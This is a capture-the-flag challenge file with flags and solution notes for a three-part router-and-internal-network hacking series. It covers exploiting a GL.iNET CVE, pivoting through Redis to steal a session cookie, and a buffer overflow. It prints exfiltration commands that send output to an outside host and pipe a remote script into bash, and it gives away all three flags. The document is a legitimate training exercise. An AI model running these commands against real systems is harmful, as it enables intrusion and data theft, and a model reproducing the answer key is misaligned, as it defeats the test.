# Home Network

## Challenge Host
http://HOST:PORT

## Name: Home Network :: 001
### Category: Home Network
### Description:
```
In the aftermath of the nuclear war that devastated the world, remnants of the pre-war technology still exist in the Commonwealth. One such remnant is a forgotten home network located in the ruins of a house near Vault 111. This home network was once owned by a skilled hacker who sought to uncover the secrets of Vault-Tec Corporation and their experiments within the vault.

As a wasteland scavenger with hacking skills, you stumble upon the remnants of this network and discover that it contains valuable information about Vault 111 and its inhabitants. Your challenge is to breach the network's security defenses and extract the hidden data.

Due to the old age, not all endpoints and features work properly, but we trust in your abilities anyway!

http://HOST:PORT

Author: [@Legoclones](https://twitter.com/legoclones)
```

### Value: 75

### Max Attempts: 0

### Flag:
`flag{hope_youre_comfortable_running_cmds_cuz_youll_Be_doing_it_a_lot}`

### Solution:
The challenge is to hack into a home network, running a GL-E750 device as the home router and only publicly exposed container. To get the first flag, the user must be able to log into the admin portal. The GL.iNET firmware version number running is 3.215, which has a public CVE that allows any user to send a request to `/cgi-bin/api/router/mesh/status` to get the LAN password. If the proper POST request is sent, the LAN password will be revealed as `th1s_1s_my_s3cur3_p4$$w0rd`, which is the same as the admin password. This is automated in `scanner.py`. 

Once the user has admin access, they need to leverage that to get RCE on the underlying file system. There are two options here - there's a previously discovered RCE vulnerability that works (see `solve/rce.py`), or the user can find their own RCE vulnerability. The flag is found in `/flag.txt`. Note that both `solve/rce.py` and `solve/scanner.py` come from publicly-available PoCs, but require some minor changes to them.




## Name: Home Network :: 002
### Category: Home Network
### Description:
```
Great job on compromising the entrypoint! But I've heard of the hacker who owned this network, and I'm sure there's more inside the network. Using the machine you've broken into, pivot into the network and see what's on there.

Author: [@Legoclones](https://twitter.com/legoclones)
```

### Value: ??

### Max Attempts: 0

### Flag:
`flag{redis_from_a_distance_ftw}`

### Solution:
Now that the participant has RCE on the IoT/entrypoint device, they must scan and exploit the rest of the internal network. Standalone executables are probably the best way to carry out attacks. These pre-compiled executables (functioning as tools) must be imported through something like `curl`, which already exists on the box, and stored in a tmp directory.

A port & ping scan of the Docker network will reveal 2 other boxes - one hosting a custom webserver and Redis db, and the other a MySQL database. The MySQL database is not relevant for this problem, instead the webserver must be compromised. The first step is to gain admin access to the note-saving website by stealing an admin session cookie from Redis. Unlike the default config, the Redis database requires authentication. However, a `backup.zip` file exists with the source code/binary of the API, in which Redis credentials can be found. This backup file is also located in `backup` to make it easier for participants to find it.

Once the `backup.zip` file is found, Redis credentials can be used to authenticate to the redis server, and 40 different session cookies can be found. Searching through all of them will reveal one admin session cookie, `ed3f2d85696656f4ea64a0f1d5ceb399`. Once this session cookie is used, an extra HTTP header will appear called `X-Flag` with the flag inside. 

```
Step-by-step from inside IoT box:
- curl http://<IP>/backup.zip -o /tmp/backup.zip
- unzip /tmp/backup.zip
- printf 'auth user password\nkeys *\n' | netcat 172.22.0.4 6379
- printf 'auth user password\nget session_ed3f2d85696656f4ea64a0f1d5ceb399\n' | netcat 172.22.0.4 6379
- curl http://172.22.0.4/api/get -H 'Cookie: session=ed3f2d85696656f4ea64a0f1d5ceb399' --head | grep flag
```

As a side note, I ran commands & obtained output from the blind RCE using this method:
- Run `sudo tail -f /var/log/nginx/access.log | grep lego`
- Run `echo 'curl https://justinapplegate.me/lego?$(command here|base64)' > /var/www/html/c`
- Run the `solve/rce.py` script with the command `curl https://justinapplegate.me/c|bash`

This will allow you to send however-long commands you want in the `c` file, and then see the output in the query string of incoming logs. It's not the most efficient approach, but it works!



## Name: Home Network :: 003
### Category: Home Network
### Description:
```
Nice job on the find! Can you find the credentials to break into the database it's using?

Author: [@Legoclones](https://twitter.com/legoclones)
```

### Value: ??

### Max Attempts: 0

### Flag:
`flag{I_hope_the_web_pwn_was_fun_XD}`

### Solution:
The last flag is hidden in the MySQL database with unguessable credentials. The only way to get those credentials is to read `/creds.txt`. There is a function inside `api.c` which will print it out for "debugging" purposes, but that function is never called. Instead, the unfinished `/create` endpoint called `create_note`, which has a buffer overflow. A simple `ret2win` (or `ret2debug`) can be used to return the credentials and access the flag. 

Since Python doesn't exist on the IoT box (and can't be installed), a `curl` command or C binary will have to suffice for delivering the exploit.

?PoC?